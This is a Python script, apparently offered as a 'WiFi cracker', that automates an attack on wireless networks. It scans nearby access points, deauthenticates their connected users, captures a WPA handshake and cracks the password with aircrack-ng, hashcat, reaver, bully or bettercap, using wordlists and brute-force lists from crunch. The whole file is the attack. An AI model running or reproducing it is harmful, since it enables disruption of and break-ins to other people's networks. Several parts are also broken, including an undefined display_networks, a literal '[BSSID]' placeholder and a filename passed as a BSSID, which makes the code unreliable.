import os
import subprocess
import time
import logging
import signal
from colorama import Fore, Style, init
from tqdm import tqdm
from manuf import manuf
import csv
from tabulate import tabulate


# Initialize colorama to automatically reset colors after each print
init(autoreset=True)

# Configure logging settings
logging.basicConfig(filename='wifi_cracker.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Print caution message
print(Fore.YELLOW + "Caution: This tool is intended for educational purposes only. Unauthorized use may violate "
      "applicable law. Use responsibly and respect privacy.")

# License text
license_text = """
{green}MIT License

Copyright (c) 2024 by Eudes Charles

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
""".format(green=Fore.GREEN)

# Print license text and ask user to confirm reading it
print(license_text)
read_license = input("Have you read the license? ({green}yes{reset}/{red}no{reset}): ".format(green=Fore.GREEN, red=Fore.RED, reset=Style.RESET_ALL)).strip().lower()

# Keep asking the user until they confirm reading the license
while read_license != 'yes':
    print(license_text)
    read_license = input("Have you read the license now? ({green}yes{reset}/{red}no{reset}): ".format(green=Fore.GREEN, red=Fore.RED, reset=Style.RESET_ALL)).strip().lower()

# Ask user to confirm understanding and agreement with the license
understand_agree = input("Do you understand and agree with the license? ({green}yes{reset}/{red}no{reset}): ".format(green=Fore.GREEN, red=Fore.RED, reset=Style.RESET_ALL)).strip().lower()

# If the user doesn't agree to the license, exit the program
if understand_agree != 'yes':
    print(Fore.RED + "You must agree to the license to use this tool. Exiting.")
    exit(1)

# Clear the screen
os.system('cls' if os.name == 'nt' else 'clear')

# Function to run shell commands and capture output
def run_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    logging.info(f"Command: {command}\nOutput: {result.stdout}\nError: {result.stderr}")
    return result.stdout, result.stderr

# Function to check if the script is run as root
def check_root():
    if os.geteuid() != 0:
        print(Fore.RED + "This script must be run as root.")
        logging.error("Please run the script as root.")
        exit(1)

# Function to display introductory message
def display_intro():
    intro = """
    ---------------------------------------------------------------------------------------
        ██╗    ██╗██╗███████╗██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
        ██║    ██║██║██╔════╝██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
        ██║ █╗ ██║██║█████╗  ██║█████╗██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
        ██║███╗██║██║██╔══╝  ██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
        ╚███╔███╔╝██║██║     ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
        ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═════╝╚═╝  ╚╝╚══════╝╚═╝  ╚═╝
                                                                        Coded By Eudes(v 1.0)
    ---------------------------------------------------------------------------------------
    """
    print(Fore.GREEN + intro)
    logging.info("Displayed intro.")
    time.sleep(3)  

# Function to check and install required tools
def check_and_install_requirements():
    required_tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng', 'hashcat', 'crunch', 'cap2hccapx.bin', 'reaver', 'bettercap', 'bully']
    
    missing_tools = []
    
    for tool in required_tools:
        out, err = run_command(f"which {tool}")
        if not out.strip():
            missing_tools.append(tool)
    
    if missing_tools:
        print(Fore.YELLOW + "The following tools are missing and will be installed: " + ", ".join(missing_tools))
        for tool in tqdm(missing_tools, desc="Installing tools"):
            if tool in ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng']:
                run_command("apt-get update && apt-get install -y aircrack-ng")
            elif tool == 'hashcat':
                run_command("apt-get update && apt-get install -y hashcat")
            elif tool == 'crunch':
                run_command("apt-get update && apt-get install -y crunch")
            elif tool == 'cap2hccapx.bin':
                run_command("apt-get update && apt-get install -y hashcat-utils")
            elif tool == 'reaver':
                run_command("apt-get update && apt-get install -y reaver")
            elif tool == 'bettercap':
                run_command("apt-get update && apt-get install -y bettercap")
            elif tool == 'bully':
                run_command("apt-get update && apt-get install -y bully")
        
        print(Fore.GREEN + "All required tools are installed.")
    else:
        print(Fore.GREEN + "All required tools are already installed.")

# Function to find wordlists
def find_wordlists():
    wordlist_directories = [
        "/usr/share/wordlists/",
        "/path/to/custom/wordlists/", 
    ]
    
    wordlists = []
    for directory in wordlist_directories:
        if os.path.isdir(directory):
            files = os.listdir(directory)
            wordlists.extend([os.path.join(directory, file) for file in files if file.endswith('.txt')])
    
    return wordlists

# Function to find tools with associated wordlists
def find_tools_with_wordlists():
    tools_with_wordlists = {
        "hashcat": ["rockyou.txt", "passwords.txt"],  
        "john": ["english.txt", "common.txt"],  
    }
    
    return tools_with_wordlists
 
# Try to enable monitor mode   
def enable_monitor_mode():
    print(Fore.YELLOW + "Enabling monitor mode...")
    
    out, err = run_command("sudo airmon-ng start wlan0")
    if "monitor mode enabled" in out:
        print(Fore.GREEN + "Monitor mode enabled.")
        return True
    else:
        print(Fore.RED + "Failed to enable monitor mode.")
        logging.error("Failed to enable monitor mode.")
        print(Fore.YELLOW + "Attempting to kill interfering processes...")
        run_command("sudo airmon-ng check kill")
        out, err = run_command("sudo airmon-ng start wlan0")
        if "monitor mode enabled" in out:
            print(Fore.GREEN + "Monitor mode enabled.")
            return True
        else:
            print(Fore.RED + "Failed to enable monitor mode after killing interfering processes.")
            logging.error("Failed to enable monitor mode after killing interfering processes.")
            return False

# def enable_monitor_mode():
#     print(Fore.YELLOW + "Enabling monitor mode...")
#     out, err = run_command("sudo airmon-ng start wlan0")
#     if "monitor mode enabled" in out:
#         print(Fore.GREEN + "Monitor mode enabled.")
#         return True
#     else:
#         print(Fore.RED + "Failed to enable monitor mode.")
#         logging.error("Failed to enable monitor mode.")
#         return False


def restart_network_manager():
    print(Fore.YELLOW + "Restarting network manager...")
    subprocess.run(["systemctl", "restart", "NetworkManager"])

def start_services():
    print(Fore.YELLOW + "Starting services...")
    subprocess.run(["systemctl", "start", "bluetooth.service"])
    subprocess.run(["systemctl", "start", "network-manager.service"])
    
scanning = True

def signal_handler(sig, frame):
    global scanning
    scanning = False

signal.signal(signal.SIGINT, signal_handler)

def get_manufacturer(bssid):
    parser = manuf.MacParser()
    return parser.get_manuf(bssid) or "Unknown"

def get_users(bssid):
    output, _ = run_command(f"airodump-ng --bssid {bssid} wlan0mon --write users --output-format csv")
    users = []
    with open('users-01.csv', 'r') as file:
        for line in file:
            if bssid in line:
                parts = line.split(',')
                if len(parts) > 0:
                    users.append(parts[0].strip())
    return users

def scan_networks():
    print(Fore.YELLOW + "Scanning for networks... Press Ctrl+C to stop the scan.")
    global scanning
    scanning = True
    networks = []

    process = subprocess.Popen(["airodump-ng", "wlan0mon"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    try:
        while scanning:
            output = process.stdout.readline().decode("utf-8")
            if "BSSID" in output:
                continue  
            if "Station MAC" in output:
                break  
            if output.strip():
                network_info = output.split(",")
                network = {
                    "BSSID": network_info[0].strip(),
                    "ESSID": network_info[13].strip(),
                    "Channel": network_info[3].strip(),
                    "Privacy": network_info[5].strip(),
                    "Cipher": network_info[6].strip(),
                    "Authentication": network_info[7].strip(),
                    "Power": network_info[8].strip(),
                    "Beacons": network_info[9].strip(),
                    "IV": network_info[10].strip(),
                    "LAN Clients": network_info[11].strip(),
                    "Station": network_info[12].strip(),
                    "Power": network_info[8].strip(),
                    "Manufacturer": get_manufacturer(network_info[0].strip()),
                    "Connected Users": ", ".join(get_users(network_info[0].strip()))
                }
                networks.append(network)
                
        headers = ["BSSID", "ESSID", "Channel", "Privacy", "Cipher", "Authentication", 
                   "Power", "Beacons", "IV", "LAN Clients", "Station", "Manufacturer", "Connected Users"]
        rows = [[network[key] for key in headers] for network in networks]
        
        print(tabulate(rows, headers=headers, tablefmt="grid"))
    except KeyboardInterrupt:
        pass
    finally:
        process.terminate()
        process.wait()

    return networks

def deauth_users(bssid, channel):
    print(Fore.YELLOW + f"Deauthenticating users from BSSID {bssid} on channel {channel}...")
    run_command(f"airodump-ng --bssid {bssid} --channel {channel} --write users_deauth --output-format csv wlan0mon")
    users = get_users(bssid)
    for user in users:
        run_command(f"aireplay-ng --deauth 1 -a {bssid} -c {user} wlan0mon")
        print(Fore.GREEN + f"{user} has been deauthenticated from the network.")

def check_handshake():
    print(Fore.YELLOW + "Checking for handshake...")
    run_command("aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] capture.cap")
    return os.path.isfile("handshake-01.cap")

def crack_handshake_with_tool(hccapx_file, wordlist, tool):
    if tool == "aircrack-ng":
        print(Fore.YELLOW + f"Cracking handshake with aircrack-ng using wordlist {wordlist}...")
        out, err = run_command(f"aircrack-ng -w {wordlist} -b {hccapx_file}")
    elif tool == "reaver":
        print(Fore.YELLOW + f"Cracking handshake with Reaver...")
        out, err = run_command(f"reaver -i wlan0mon -b {hccapx_file} -vv")
    elif tool == "bettercap":
        print(Fore.YELLOW + f"Cracking handshake with Bettercap...")
        out, err = run_command(f"bettercap -eval 'wifi.recon on; wifi.assoc -b {hccapx_file}'")
    elif tool == "bully":
        print(Fore.YELLOW + f"Cracking handshake with Bully...")
        out, err = run_command(f"bully -b {hccapx_file} -c 6 -v 3 -F")
    elif tool == "hashcat":
        print(Fore.YELLOW + f"Cracking handshake with Hashcat using wordlist {wordlist}...")
        out, err = run_command(f"hashcat -m 2500 {hccapx_file} {wordlist} --force")
    
    if "Cracked" in out or "Found" in out:
        print(Fore.GREEN + "Password found!")
        print(out)
        logging.info(f"Password found with {tool} and wordlist {wordlist}.")
        return True
    return False

def generate_passwords():
    crunch_command = "crunch 8 12 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*() -o generated_wordlist.txt"
    print(Fore.YELLOW + f"Generating passwords with command: {crunch_command}")
    run_command(crunch_command)

def convert_cap_to_hccapx(cap_file):
    hccapx_file = cap_file.replace('.cap', '.hccapx')
    run_command(f"cap2hccapx.bin {cap_file} {hccapx_file}")
    return hccapx_file

def main():
    check_root()
    
    display_intro()
    
    check_and_install_requirements()
    
    if not enable_monitor_mode():
        print(Fore.RED + "Warning: Monitor mode could not be enabled. Some features may not work properly.")

    networks = scan_networks()
    display_networks(networks)
    
    network_number = int(input(Fore.CYAN + "Select a network by number: "))
    if network_number < 1 or network_number > len(networks):
        print(Fore.RED + "Invalid network number. Please try again.")
        logging.error("Invalid network number selected.")
        return
    
    selected_network = networks[network_number - 1]
    bssid = selected_network['BSSID']
    channel = selected_network['Channel']
    
    deauth_users(bssid, channel)
    
    if check_handshake():
        print(Fore.GREEN + "Handshake captured successfully.")
        logging.info("Handshake captured successfully.")
        
        hccapx_file = convert_cap_to_hccapx("handshake-01.cap")
        
        tools = ["aircrack-ng", "reaver", "bettercap", "bully", "hashcat"]
        wordlists = find_wordlists()
        
        if not wordlists:
            print(Fore.RED + "No wordlists found. Exiting.")
            logging.error("No wordlists found. Exiting.")
            return
        
        print(Fore.CYAN + "Select the tool you want to use for cracking:")
        for i, tool in enumerate(tools):
            print(Fore.CYAN + f"{i + 1}. {tool}")
        
        tool_number = int(input(Fore.CYAN + "Enter the tool number: "))
        if tool_number < 1 or tool_number > len(tools):
            print(Fore.RED + "Invalid tool number. Proceeding with default sequence.")
            logging.warning("Invalid tool number selected, proceeding with default sequence.")
            tool_number = 1

        selected_tool = tools[tool_number - 1]
        
        for wordlist in wordlists:
            if crack_handshake_with_tool(hccapx_file, wordlist, selected_tool):
                return
        
        for tool in tools[tool_number:]:
            if tool == "hashcat":
                generate_passwords()
                if crack_handshake_with_tool(hccapx_file, "generated_wordlist.txt", "hashcat"):
                    print(Fore.GREEN + "Password cracked with generated passwords.")
                    logging.info("Password cracked with generated passwords.")
                    return
            elif any(crack_handshake_with_tool(hccapx_file, wordlist, tool) for wordlist in wordlists):
                print(Fore.GREEN + "Password cracked with next available tool.")
                return
        
        print(Fore.RED + "Failed to crack the password with all available tools and wordlists.")
        logging.info("Failed to crack the password with all available tools and wordlists.")
    else:
        print(Fore.RED + "Failed to capture handshake.")
        logging.error("Failed to capture handshake.")
    
    print(Fore.YELLOW + "Exiting.")

if __name__ == "__main__":
    main()
